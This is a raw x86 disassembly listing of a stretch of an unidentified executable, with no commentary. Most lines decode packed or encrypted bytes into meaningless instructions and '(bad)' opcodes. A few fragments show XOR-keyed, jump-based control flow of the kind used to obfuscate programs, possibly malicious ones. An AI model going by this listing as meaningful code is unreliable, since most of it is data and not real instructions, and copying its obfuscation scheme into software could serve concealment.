  40fb2d:	ins    BYTE PTR es:[edi],dx
  40fb2e:	(bad)  
  40fb2f:	jnp    0x40facc
  40fb31:	stc    
  40fb32:	mov    esp,0x6bae4405
  40fb37:	mov    ebx,0xeee9637d
  40fb3c:	cmp    DWORD PTR [edi],ecx
  40fb3e:	fnstsw WORD PTR [edi-0x7d]
  40fb41:	push   0xe97a8c0
  40fb46:	mov    ch,0xbc
  40fb48:	add    ebx,DWORD PTR [edi]
  40fb4a:	out    0xff,eax
  40fb4c:	into   
  40fb4d:	cmp    BYTE PTR [edx-0x63],bh
  40fb50:	cmp    al,0x50
  40fb52:	and    dl,ch
  40fb54:	fs loop 0x40fb81
  40fb57:	outs   dx,BYTE PTR ds:[esi]
  40fb58:	mov    ebp,0x1f6d6e13
  40fb5d:	inc    edi
  40fb5e:	hlt    
  40fb5f:	jae    0x40fae2
  40fb61:	(bad)  
  40fb62:	out    0xc0,al
  40fb64:	lods   eax,DWORD PTR ds:[esi]
  40fb65:	mov    esi,0x786b4a98
  40fb6a:	and    eax,0x19ede250
  40fb6f:	mov    dl,0x8a
  40fb71:	push   cs
  40fb72:	dec    ebp
  40fb73:	pop    ss
  40fb74:	push   cs
  40fb75:	lods   al,BYTE PTR ds:[esi]
  40fb76:	popa   
  40fb77:	jmp    0x40fb5a
  40fb79:	adc    al,0x78
  40fb7b:	ja     0x40fb0a
  40fb7d:	gs jae 0x40fb59
  40fb80:	dec    edi
  40fb81:	into   
  40fb82:	xchg   ebx,eax
  40fb83:	pop    ecx
  40fb84:	mov    ds:0x4311b466,al
  40fb89:	je     0x40fbca
  40fb8b:	in     al,dx
  40fb8c:	jne    0x40fb3f
  40fb8e:	nop
  40fb8f:	outs   dx,DWORD PTR ds:[esi]
  40fb90:	sti    
  40fb91:	cld    
  40fb92:	jp     0x40fbd8
  40fb94:	mov    ch,0xcd
  40fb96:	add    BYTE PTR [edx],dl
  40fb98:	mov    al,0x59
  40fb9a:	sbb    cl,BYTE PTR [eax-0x6c49c60e]
  40fba0:	fidiv  WORD PTR [ebx-0x6d29b3da]
  40fba6:	into   
  40fba7:	pop    esi
  40fba8:	jp     0x40fb79
  40fbaa:	mov    dl,BYTE PTR [esi-0x3341311a]
  40fbb0:	sbb    ah,BYTE PTR [ebx-0x626503f9]
  40fbb6:	push   0xdb6b3346
  40fbbb:	pop    eax
  40fbbc:	sub    eax,0x9345b5dc
  40fbc1:	rcl    BYTE PTR [esi+0x3c],cl
  40fbc4:	add    al,0xaf
  40fbc6:	jmp    0x2d0a1186
  40fbcb:	sahf   
  40fbcc:	jno    0x40fba1
  40fbce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbcf:	sbb    BYTE PTR [edx+0x76],ch
  40fbd2:	jg     0x40fc0f
  40fbd4:	xchg   edx,eax
  40fbd5:	pop    eax
  40fbd6:	xchg   DWORD PTR [ebx],esi
  40fbd8:	repnz loopne 0x40fc2d
  40fbdb:	push   ebx
  40fbdc:	sub    eax,0x2485c5c2
  40fbe1:	pmullw mm1,QWORD PTR [ecx+0x722be0c3]
  40fbe8:	imul   esi,eax,0xf5b342c8
  40fbee:	xchg   esi,eax
  40fbef:	gs jg  0x40fc69
  40fbf2:	aas    
  40fbf3:	(bad)  
  40fbf4:	adc    DWORD PTR [esi-0xe],esp
  40fbf7:	or     DWORD PTR [ebp+eax*1+0x13],0x1f37756b
  40fbff:	jo     0x40fb8c
  40fc01:	dec    edx
  40fc02:	call   0xaaaed187
  40fc07:	aad    0x2d
  40fc09:	shl    BYTE PTR fs:[esi-0x7bc12324],0xc2
  40fc11:	pusha  
  40fc12:	and    cl,BYTE PTR [edx+ecx*4+0x1f]
  40fc16:	in     eax,dx
  40fc17:	pop    es
  40fc18:	ret    0xb07f
  40fc1b:	dec    ecx
  40fc1c:	ins    BYTE PTR es:[edi],dx
  40fc1d:	pop    ebp
  40fc1e:	sbb    BYTE PTR [eax+0x31],dh
  40fc21:	or     ch,BYTE PTR [ebp+esi*1-0x31]
  40fc25:	sub    eax,0x68121c80
  40fc2a:	adc    al,0x6
  40fc2c:	cdq    
  40fc2d:	test   esp,ecx
  40fc2f:	gs fcmove st,st(6)
  40fc32:	mov    dh,0x1a
  40fc34:	mov    eax,0xdf3b7fda
  40fc39:	adc    al,0x44
  40fc3b:	cs mov eax,0x15778b7c
  40fc41:	adc    ebx,DWORD PTR [eax-0x45]
  40fc44:	mov    bh,0xca
  40fc46:	jnp    0x40fcb3
  40fc48:	test   BYTE PTR [esi],cl
  40fc4a:	sbb    ebp,DWORD PTR [edx]
  40fc4c:	cmp    al,0x69
  40fc4e:	fld    TBYTE PTR [edx]
  40fc50:	cmp    eax,DWORD PTR [edx+0x29]
  40fc53:	in     eax,0x2e
  40fc55:	push   ebp
  40fc56:	mov    edx,DWORD PTR [ebp+0x58]
  40fc59:	pushf  
  40fc5a:	ror    DWORD PTR [edx],cl
  40fc5c:	inc    ebp
  40fc5d:	psraw  mm6,mm0
  40fc60:	sbb    dh,BYTE PTR [eax-0xd96f6ff]
  40fc66:	or     eax,0x2e37a80b
  40fc6b:	xchg   ecx,eax
  40fc6c:	aam    0xce
  40fc6e:	and    edi,edi
  40fc70:	or     DWORD PTR [ecx+edi*8+0x30c814a3],ebp
  40fc77:	pop    edi
  40fc78:	loopne 0x40fcae
  40fc7a:	push   edx
  40fc7b:	push   edi
  40fc7c:	mov    edx,0x46d6d4de
  40fc81:	in     al,0x1c
  40fc83:	jno    0x40fcac
  40fc85:	bound  edi,QWORD PTR [edx]
  40fc87:	inc    esi
  40fc88:	bound  ecx,QWORD PTR [edi]
  40fc8a:	mov    dl,0x49
  40fc8c:	dec    ecx
  40fc8d:	in     eax,0xb4
  40fc8f:	mov    edx,0xc613f1e3
  40fc94:	jmp    0x2aac6d62
  40fc99:	cdq    
  40fc9a:	fcomip st,st(2)
  40fc9c:	or     DWORD PTR [edi],esp
  40fc9e:	into   
  40fc9f:	test   eax,0xb9d591f5
  40fca4:	frstor es:[ebx-0x59093a4e]
  40fcac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcad:	jp     0x40fce3
  40fcaf:	sub    DWORD PTR [bx-0x64],0xffffffbc
  40fcb4:	xor    al,BYTE PTR [ebp+0x31c46774]
  40fcba:	test   DWORD PTR [esi+0x7e],esp
  40fcbd:	xor    eax,0xed62ec25
  40fcc2:	sub    DWORD PTR [edi],esp
  40fcc4:	cmp    BYTE PTR [ebp+0x7bd936cd],bl
  40fcca:	push   ss
  40fccb:	push   0x9f5fa71f
  40fcd0:	push   ss
  40fcd1:	push   ebx
  40fcd2:	ins    BYTE PTR es:[edi],dx
  40fcd3:	repnz (bad) [ecx-0x1cfccfa4]
  40fcda:	xchg   esi,eax
  40fcdb:	push   edi
  40fcdc:	dec    edx
  40fcdd:	(bad)  
  40fcde:	jmp    0x8779385a
  40fce3:	popa   
  40fce4:	pop    es
  40fce5:	pop    esi
  40fce6:	dec    esi
  40fce7:	cmp    bh,bl
  40fce9:	inc    esp
  40fcea:	addr16 add ebp,ebp
  40fced:	or     cl,BYTE PTR [eax]
  40fcef:	les    ecx,FWORD PTR [eax+0x59]
  40fcf2:	ja     0x40fcc0
  40fcf4:	and    DWORD PTR [eax-0x48e9c8a6],0x10
  40fcfb:	pop    eax
  40fcfc:	cmc    
  40fcfd:	aas    
  40fcfe:	jbe    0x40fc93
  40fd00:	xchg   ecx,eax
  40fd01:	inc    eax
  40fd02:	sub    ecx,edx
  40fd04:	cmp    dl,BYTE PTR [eax+0x55b80c0]
  40fd0a:	or     ah,BYTE PTR [esi-0x2f]
  40fd0d:	sbb    al,0x5
  40fd0f:	inc    esi
  40fd10:	mov    WORD PTR [eax+esi*2],ss
  40fd13:	dec    ebx
  40fd14:	mov    dh,0x2c
  40fd16:	jg     0x40fcaf
  40fd18:	add    al,0x23
  40fd1a:	xor    eax,0x7510855
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	pop    es
  40fd75:	or     esp,esp
  40fd77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd78:	fdiv   DWORD PTR [edi+0x7d497070]
  40fd7e:	jo     0x40fdf0
  40fd80:	and    bh,bl
  40fd82:	outs   dx,BYTE PTR ds:[esi]
  40fd83:	repz xor bl,BYTE PTR [eax+0x9]
  40fd87:	mov    esp,0xd4cdda28
  40fd8c:	push   0x7881b66e
  40fd91:	(bad)  
  40fd93:	push   edx
  40fd94:	(bad)
  40fd97:	pop    esi
  40fd98:	sbb    al,0x4b
  40fd9a:	mov    edx,0xabb1a3f1
  40fd9f:	jb     0x40fd7a
  40fda1:	popa   
  40fda2:	jmp    0x40fe11
  40fda4:	push   edx
  40fda5:	jg     0x40fe0a
  40fda7:	jbe    0x40fd5e
  40fda9:	xchg   esi,eax
  40fdaa:	inc    edx
  40fdab:	jae    0x40fdd6
  40fdad:	jg     0x40fd79
  40fdaf:	repnz push cs
  40fdb1:	ins    BYTE PTR es:[edi],dx
  40fdb2:	dec    edx
  40fdb3:	cmp    ebp,DWORD PTR [ecx]
  40fdb5:	ds dec esi
  40fdb7:	dec    esp
  40fdb8:	fs cdq 
  40fdba:	ret    
  40fdbb:	(bad)  
  40fdbc:	jae    0x40fe03
  40fdbe:	test   DWORD PTR [esi+0x20588588],0x9bc54ff8
  40fdc8:	(bad)  
  40fdc9:	lock xor edx,edi
  40fdcc:	xchg   esi,eax
  40fdcd:	inc    edx
  40fdce:	pop    eax
  40fdcf:	test   BYTE PTR [ebp+0x12],ch
  40fdd2:	ins    BYTE PTR es:[edi],dx
  40fdd3:	repz sub eax,0x365bb841
  40fdd9:	add    dl,BYTE PTR [edx]
  40fddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fddc:	or     BYTE PTR [ecx+0x5d],cl
  40fddf:	add    BYTE PTR [eax-0x5123c145],cl
  40fde5:	pop    eax
  40fde6:	mov    ebx,0xf2fc8e9d
  40fdeb:	retf   0x3196
  40fdee:	and    ebp,esp
  40fdf0:	data16 cld 
  40fdf2:	or     edi,DWORD PTR [ecx]
  40fdf4:	dec    edx
  40fdf5:	or     DWORD PTR [ebp+0x25],0xfffffffa
  40fdf9:	ficom  WORD PTR [edx]
  40fdfb:	dec    edx
  40fdfc:	stc    
  40fdfd:	cld    
  40fdfe:	das    
  40fdff:	cmpps  xmm2,XMMWORD PTR [edx],0xb3
  40fe03:	add    al,BYTE PTR [ecx+esi*2-0x65ec04f8]
  40fe0a:	or     ch,dh
  40fe0c:	sub    BYTE PTR [ebx+0xff4a59d],0xa6
  40fe13:	test   DWORD PTR [esi+0x11],eax
  40fe16:	and    DWORD PTR [eax+eiz*8],ecx
  40fe19:	clc    
  40fe1a:	mov    es:0x59de1ff,al
  40fe20:	stos   DWORD PTR es:[edi],eax
  40fe21:	cs push 0xec6d45c0
  40fe27:	fsub   DWORD PTR [edx-0x5f]
  40fe2a:	add    BYTE PTR [ebx],ah
  40fe2c:	ja     0x40fde0
  40fe2e:	xor    DWORD PTR [eax+0x2a],0xffffffbf
  40fe32:	retf   0x715e
  40fe35:	es iret 
  40fe37:	cmp    eax,0xb84462fd
  40fe3c:	fs xor esi,esi
  40fe3f:	mov    ecx,0x874bb9ee
  40fe44:	sbb    bh,BYTE PTR [ebp-0x1da0cdb8]
  40fe4a:	cmp    eax,0x48013a0f
  40fe4f:	xchg   DWORD PTR [edi-0x4ff458bf],edi
  40fe55:	xchg   edx,eax
  40fe56:	int    0x68
  40fe58:	into   
  40fe59:	jns    0x40fe70
  40fe5b:	mov    bl,0x1
  40fe5d:	jae    0x40fe43
  40fe5f:	in     al,dx
  40fe60:	int    0xec
  40fe62:	mov    al,0xa1
  40fe64:	out    dx,al
  40fe65:	pop    ebp
  40fe66:	call   0x93ea3804
  40fe6b:	shl    DWORD PTR [edx],cl
  40fe6d:	xchg   ecx,eax
  40fe6e:	and    DWORD PTR [eax+0x6d],edx
  40fe71:	call   0x483f8e2d
  40fe76:	adc    dh,BYTE PTR [edi+0x30]
  40fe79:	ins    BYTE PTR es:[edi],dx
  40fe7a:	xor    cl,BYTE PTR [edx+0x0]
  40fe7d:	and    al,0x22
  40fe7f:	xor    esi,DWORD PTR [ebp-0x77]
  40fe82:	jne    0x40fe76
  40fe84:	xchg   DWORD PTR [ebx-0xd],ebp
  40fe87:	fucom  st(0)
  40fe89:	leavew 
  40fe8b:	sbb    esp,DWORD PTR [edx+0x3ae67769]
  40fe91:	push   ebx
  40fe92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe93:	mov    ecx,0xd20c602e
  40fe98:	mov    ebp,0x27eebe9a
  40fe9d:	jecxz  0x40fe80
  40fe9f:	retf   
  40fea0:	dec    esp
  40fea1:	push   ds
  40fea2:	stc    
  40fea3:	jg     0x40fec1
  40fea5:	ss retf 
  40fea7:	add    al,BYTE PTR [edi+0x78f892bb]
  40fead:	sahf   
  40feae:	push   edx
  40feaf:	in     eax,0x48
  40feb1:	sbb    edx,esi
  40feb3:	push   esi
  40feb4:	ins    BYTE PTR es:[edi],dx
  40feb5:	sbb    ch,BYTE PTR [ecx-0x1545afc9]
  40febb:	outs   dx,DWORD PTR ds:[esi]
  40febc:	popa   
  40febd:	mov    ebp,0xe4be97e0
  40fec2:	dec    ebp
  40fec3:	sbb    eax,0x2b97e289
  40fec8:	sbb    DWORD PTR [edx+0x58],0x581a9126
  40fecf:	(bad)  
  40fed0:	adc    al,bh
  40fed2:	jno    0x40fea9
  40fed4:	inc    ebx
  40fed5:	ds push ecx
  40fed7:	scas   al,BYTE PTR es:[edi]
  40fed8:	loopne 0x40ff51
  40feda:	(bad)  
  40fedb:	push   ebp
  40fedc:	imul   ebx,DWORD PTR [eax+0x11109cca],0x63
  40fee3:	and    ecx,eax
  40fee5:	(bad)  
  40fee6:	fiadd  WORD PTR [ebx+eax*1+0x52e54fb5]
  40feed:	pop    eax
  40feee:	and    ah,bl
  40fef0:	test   al,0x1f
  40fef2:	xor    dh,BYTE PTR [ebx]
  40fef4:	xor    ebx,ebx
  40fef6:	jo     0x40ff0e
  40fef8:	push   ebx
  40fef9:	pop    es
  40fefa:	gs (bad) 
  40fefc:	dec    esp
  40fefd:	and    BYTE PTR ds:0x4691569c,cl
  40ff03:	cli    
  40ff04:	cmp    al,0xb4
  40ff06:	test   DWORD PTR [ebp-0x59],esp
  40ff09:	mov    ds:0xc14b667c,al
  40ff0e:	jecxz  0x40ff4e
  40ff10:	or     edx,DWORD PTR [esi]
  40ff12:	inc    ebx
  40ff13:	jno    0x40ff17
  40ff15:	pop    ecx
  40ff16:	pop    ds
  40ff17:	xchg   BYTE PTR [esi-0x30],al
  40ff1a:	out    0xbe,eax
  40ff1c:	add    al,0xc8
  40ff1e:	test   eax,0x5d54a114
  40ff23:	je     0x40fec5
  40ff25:	sub    eax,0x4531ebd8
  40ff2a:	into   
  40ff2b:	lods   eax,DWORD PTR ds:[esi]
  40ff2c:	inc    BYTE PTR [ebp-0x1e96f349]
  40ff32:	aam    0xd6
  40ff34:	inc    edi
  40ff35:	push   edi
  40ff36:	add    esi,DWORD PTR ds:0xae66ab20
  40ff3c:	add    eax,0x2d4d4a9c
  40ff41:	xchg   edi,eax
  40ff42:	leave  
  40ff43:	xor    BYTE PTR [esi],bh
  40ff45:	js     0x40fed7
  40ff47:	push   cs
  40ff48:	pop    esi
  40ff49:	cwde   
  40ff4a:	mov    BYTE PTR [edx-0x6c],bh
  40ff4d:	retf   
  40ff4e:	cdq    
  40ff4f:	xchg   esi,eax
  40ff50:	aam    0x2a
  40ff52:	dec    ecx
  40ff53:	sti    
  40ff54:	mov    dh,0x7b
  40ff56:	pop    ebx
  40ff57:	push   esp
  40ff58:	pop    es
  40ff59:	call   0x6a69:0xf0b4f523
  40ff60:	arpl   ax,dx
  40ff62:	mov    ds:0xe901ba16,eax
  40ff67:	ins    BYTE PTR es:[edi],dx
  40ff68:	mov    eax,DWORD PTR [ebx]
  40ff6a:	add    al,0x82
  40ff6c:	iret   
  40ff6d:	xor    al,0xba
  40ff6f:	shr    DWORD PTR [edi+edi*4],cl
  40ff72:	mov    edx,0x2bc8978b
  40ff77:	push   ds
  40ff78:	xor    DWORD PTR [eax],0x854dcbb2
  40ff7e:	inc    ecx
  40ff7f:	fadd   st(3),st
  40ff81:	fidiv  WORD PTR [eax-0x11]
  40ff84:	sbb    BYTE PTR [eax+0x54],bh
  40ff87:	sbb    BYTE PTR [edi+0x61e9ad73],ah
  40ff8d:	push   ecx
  40ff8e:	dec    esp
  40ff8f:	cdq    
  40ff90:	out    dx,al
  40ff91:	sbb    al,0xd4
  40ff93:	(bad)  [ecx-0x22]
  40ff96:	jle    0x40ff7e
  40ff98:	mov    edi,0x82b3edf9
  40ff9d:	(bad)  
  40ff9e:	xor    BYTE PTR [edx+0x32c00e63],0xa5
  40ffa5:	enter  0xb240,0xb
  40ffa9:	in     al,0x30
  40ffab:	add    esi,DWORD PTR [ecx]
  40ffad:	inc    ebx
  40ffae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffaf:	inc    edi
  40ffb0:	pusha  
  40ffb1:	adc    edi,ecx
  40ffb3:	dec    ebx
  40ffb4:	mov    dh,0x6
  40ffb6:	mov    dl,0x88
  40ffb8:	in     al,0x30
  40ffba:	and    BYTE PTR [esi],0xae
  40ffbd:	lahf   
  40ffbe:	ret    0x3f9
  40ffc1:	inc    edx
  40ffc2:	xchg   ebx,eax
  40ffc3:	push   esi
  40ffc4:	repz inc ecx
  40ffc6:	pop    es
  40ffc7:	jae    0x41002e
  40ffc9:	outs   dx,BYTE PTR ds:[esi]
  40ffca:	add    esi,edi
  40ffcc:	mov    dl,0x17
  40ffce:	pop    edi
  40ffcf:	cli    
  40ffd0:	mov    ebx,DWORD PTR [edx-0x38b0de8]
  40ffd6:	sahf   
  40ffd7:	inc    ebp
  40ffd8:	icebp  
  40ffd9:	sub    eax,0xe27ecaa2
  40ffde:	xchg   edi,eax
  40ffdf:	or     bl,al
  40ffe1:	ss cdq 
  40ffe3:	xor    edx,DWORD PTR [edx]
  40ffe5:	sbb    DWORD PTR [eax+0x5ddad0bf],ebp
  40ffeb:	fdiv   DWORD PTR [edx+0x66]
  40ffee:	sbb    ecx,edi
  40fff0:	dec    edi
  40fff1:	lock mov ebx,0x12e39827
  40fff7:	(bad)  
  40fff8:	(bad)  
  40fff9:	hlt    
  40fffa:	cs pop esi
  40fffc:	pop    esi
  40fffd:	mov    WORD PTR [ecx+0x19],cs
  410000:	test   al,0x70
  410002:	aaa    
  410003:	repz mov edi,0x9ffdd3bf
  410009:	xlat   BYTE PTR ds:[ebx]
  41000a:	gs into 
  41000c:	adc    BYTE PTR [edi-0x42de6cd0],bh
  410012:	test   DWORD PTR [ecx-0x53],0x55fae2e5
  410019:	lods   eax,DWORD PTR ds:[esi]
  41001a:	lds    ebx,FWORD PTR [edx-0x5c]
  41001d:	mov    bh,0xcf
  41001f:	pop    es
  410020:	push   ss
  410021:	cmp    ch,bl
  410023:	popa   
  410024:	push   es
  410025:	add    al,0x56
  410027:	jecxz  0x410083
  410029:	int    0x88
  41002b:	(bad)  
  41002c:	hlt    
  41002d:	test   eax,0x6ec36378
  410032:	pop    ecx
  410033:	pop    es
  410034:	pop    esi
  410035:	lahf   
  410036:	ins    BYTE PTR es:[edi],dx
  410037:	fbstp  TBYTE PTR [ebp+ecx*2+0x33]
  41003b:	or     dh,al
  41003d:	add    eax,0x335e1112
  410042:	pop    ecx
  410043:	mov    eax,ds:0xbf40eb4a
  410048:	jne    0x410039
  41004a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41004b:	inc    eax
  41004c:	ja     0x4100bf
  41004e:	bswap  ebx
  410050:	cmp    DWORD PTR [edx+0x12],ebx
  410053:	popf   
  410054:	xchg   ebx,eax
  410055:	cmp    al,0x68
  410057:	out    0xd7,eax
  410059:	inc    esi
  41005a:	sbb    esp,DWORD PTR [eax]
  41005c:	add    BYTE PTR [eax-0x7cd89ee9],dh
  410062:	repnz mov dl,0x53
  410065:	sbb    eax,0x5611f523
  41006a:	lods   al,BYTE PTR ds:[esi]
  41006b:	enter  0xdfed,0x5b
  41006f:	mov    ds:0xe07af53c,eax
  410074:	test   al,0x69
  410076:	push   esp
  410077:	lods   al,BYTE PTR ds:[esi]
  410078:	(bad)  
  410079:	xchg   ecx,eax
  41007a:	fld    QWORD PTR [ebx+0x2d]
  41007d:	fiadd  WORD PTR [eax+0x45]
  410080:	add    BYTE PTR [esi],0x31
  410083:	and    BYTE PTR [ebp-0x2d018943],0xc5
  41008a:	imul   esi,DWORD PTR [esi],0xbf327b55
  410090:	sub    ebx,esp
  410092:	push   ss
  410093:	sti    
  410094:	jmp    0x4100fd
  410096:	jno    0x410044
  410098:	push   0x1bf89d18
  41009d:	or     al,0xb6
  41009f:	nop
  4100a0:	addr16 pop ecx
  4100a3:	sbb    BYTE PTR [ecx],0xda
  4100a6:	icebp  
  4100a7:	fisubr DWORD PTR [edi-0x4b4a43a6]
  4100ad:	lea    ebx,[eax+0x6cad7768]
  4100b3:	xor    al,0xab
  4100b5:	jp     0x410129
  4100b7:	stos   DWORD PTR es:[edi],eax
  4100b8:	aas    
  4100b9:	sbb    BYTE PTR [edi+0x19],ch
  4100bc:	cmp    al,BYTE PTR [ecx-0x5d]
  4100bf:	and    BYTE PTR [edx+0x264a60c],bh
  4100c5:	pop    es
  4100c6:	add    BYTE PTR [esi],0xe2
  4100c9:	loope  0x4100b2
  4100cb:	sbb    esi,DWORD PTR [eiz*8-0x38a5d80b]
  4100d2:	imul   ebx,DWORD PTR [ecx],0x8f4f571c
  4100d8:	add    cl,BYTE PTR [esi]
  4100da:	rcl    BYTE PTR [ebx],0x9d
  4100dd:	adc    eax,0xbf060500
  4100e2:	mov    edx,DWORD PTR [ebx-0x53]
  4100e5:	mov    cl,0x9f
  4100e7:	inc    esp
  4100e8:	mov    al,0x13
  4100ea:	aaa    
  4100eb:	sar    DWORD PTR [edx-0x21cf295b],cl
  4100f1:	int3   
  4100f2:	pop    ds
  4100f3:	das    
  4100f4:	add    esp,ebx
  4100f6:	jns    0x410170
  4100f8:	cmp    edx,0x21d01238
  4100fe:	retf   0x2100
  410101:	sub    edx,DWORD PTR [eax+0x5321339a]
  410107:	outs   dx,DWORD PTR ds:[esi]
  410108:	lea    edx,[esi+ebx*4]
  41010b:	jns    0x4100c8
  41010d:	add    ecx,DWORD PTR [edx*8+0x615b90d0]
  410114:	pop    esp
  410115:	test   al,0xd8
  410117:	pushf  
  410118:	and    al,0xa
  41011a:	retf   0xd59
  41011d:	lods   al,BYTE PTR ds:[esi]
  41011e:	push   ebx
  41011f:	dec    eax
  410120:	push   edx
  410121:	add    esp,0x995fe49
  410127:	std    
  410128:	inc    edi
  410129:	mov    WORD PTR [eax-0x4c8a8b02],?
  41012f:	fdivr  DWORD PTR [edx]
  410131:	ret    
  410132:	mov    BYTE PTR [esi-0x58],bh
  410135:	rol    ebx,cl
  410137:	outs   dx,DWORD PTR ds:[esi]
  410138:	jle    0x410177
  41013a:	jnp    0x410168
  41013c:	sub    eax,0x893f8f56
  410141:	rcl    BYTE PTR [eax],0x2c
  410144:	test   BYTE PTR [ebx+ecx*1+0x10f3f3b0],bh
  41014b:	mov    WORD PTR [eax+0x41eaa8c7],gs
  410151:	test   al,0xdd
  410153:	(bad)  
  410154:	rcr    BYTE PTR ss:[eax-0x7af037c5],cl
  41015b:	or     eax,0x8b000000
  410160:	inc    ebp
  410161:	cld    
  410162:	xor    eax,0x7510855
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	movntq QWORD PTR [edx+0x70b33140],mm1
  410190:	jo     0x4101db
  410192:	jge    0x410204
  410194:	jo     0x4101be
  410196:	push   es
  410197:	cmp    eax,0x23a83086
  41019c:	out    0xc8,eax
  41019e:	arpl   WORD PTR [ecx],si
  4101a0:	dec    ecx
  4101a1:	ins    DWORD PTR es:[edi],dx
  4101a2:	nop
  4101a3:	cld    
  4101a4:	push   esi
  4101a5:	ins    BYTE PTR es:[edi],dx
  4101a6:	push   ds
  4101a7:	je     0x41014d
  4101a9:	fnstcw WORD PTR [ebp-0x5c]
  4101ac:	jl     0x4101ca
  4101ae:	xchg   ecx,eax
  4101af:	ret    
  4101b0:	fstp   TBYTE PTR [edx-0xff12d66]
  4101b6:	cmp    eax,DWORD PTR [edi+edi*4]
  4101b9:	iret   
  4101ba:	pop    ds
  4101bb:	or     BYTE PTR [ecx+0x57],0x4f
  4101bf:	mov    esi,0x4ca9d548
  4101c4:	stos   DWORD PTR es:[edi],eax
  4101c5:	push   0xac6f63e
  4101ca:	xchg   BYTE PTR [edx],ah
  4101cc:	stos   BYTE PTR es:[edi],al
  4101cd:	dec    ecx
  4101ce:	pop    esp
  4101cf:	sub    DWORD PTR [edi],esi
  4101d1:	mov    WORD PTR [edx+0x47],?
  4101d4:	jns    0x410172
  4101d6:	call   0x6381:0x8f8341d0
  4101dd:	ret    0x811c
  4101e0:	retf   
  4101e1:	ins    DWORD PTR es:[edi],dx
  4101e2:	pop    esp
  4101e3:	inc    esi
  4101e4:	or     al,0xa0
  4101e6:	das    
  4101e7:	pop    ecx
  4101e8:	pop    edx
  4101e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ea:	push   cs
  4101eb:	lea    ebp,[ecx]
  4101ed:	inc    edx
  4101ee:	aad    0x8a
  4101f0:	in     eax,0x50
  4101f2:	or     eax,0x6410e8b9
  4101f7:	or     ebx,DWORD PTR [edx-0x53]
  4101fa:	stc    
  4101fb:	sub    ch,BYTE PTR [esi-0x2f72a766]
  410201:	pop    edx
  410202:	pop    esp
  410203:	lods   al,BYTE PTR ds:[esi]
  410204:	push   es
  410205:	sub    esp,ebx
  410207:	scas   al,BYTE PTR es:[edi]
  410208:	fbld   TBYTE PTR [edx]
  41020a:	mov    ebx,0x2e477110
  41020f:	cmc    
  410210:	hlt    
  410211:	push   edx
  410212:	adc    esp,DWORD PTR [edi+0x1]
  410215:	add    DWORD PTR [edx-0x50],0x8e1647aa
  41021c:	or     ch,BYTE PTR [esi-0x5cbf0acc]
  410222:	dec    ecx
  410223:	stos   BYTE PTR es:[edi],al
  410224:	push   0xffffffd5
  410226:	adc    al,0x5a
  410228:	loop   0x410218
  41022a:	pop    ds
  41022b:	es push ecx
  41022d:	inc    eax
  41022e:	sub    al,0x3a
  410230:	cmp    DWORD PTR [edx-0x59275288],esi
  410236:	aaa    
  410237:	in     eax,0x1f
  410239:	push   ebp
  41023a:	inc    edx
  41023b:	mov    dl,0x6c
  41023d:	gs pop esp
  41023f:	int3   
  410240:	rcr    BYTE PTR [edi],cl
  410242:	pop    edx
  410243:	je     0x4101fd
  410245:	jb     0x4102b4
  410247:	lahf   
  410248:	sbb    DWORD PTR [edx-0x29],edx
  41024b:	daa    
  41024c:	inc    edx
  41024d:	sub    eax,0x632800e7
  410252:	xchg   DWORD PTR [ebx-0x57c41f71],edi
  410258:	pop    ds
  410259:	xor    eax,0x9d99f743
  41025e:	pop    ebx
  41025f:	jno    0x41022f
  410261:	cmp    eax,0xf611a754
  410266:	pop    esp
  410267:	mov    esp,0xd26aeeb9
  41026c:	cmc    
  41026d:	mov    esp,0xe20399b5
  410272:	xlat   BYTE PTR ds:[ebx]
  410273:	jb     0x410257
  410275:	addr16 mov ch,0xf4
  410278:	test   ch,ah
  41027a:	ins    BYTE PTR es:[edi],dx
  41027b:	rcl    bh,0x1b
  41027e:	(bad)  
  41027f:	jo     0x410226
  410281:	ror    dl,cl
  410283:	sbb    al,0x43
  410285:	dec    ecx
  410286:	xchg   DWORD PTR [eax-0x3e3797ba],edi
  41028c:	dec    eax
  41028d:	jne    0x4102e0
  41028f:	dec    ebx
  410290:	cmp    eax,0xd1720a5e
  410295:	lahf   
  410296:	cld    
  410297:	cmp    BYTE PTR [edx],0xfd
  41029a:	hlt    
  41029b:	jmp    0xcd91c49f
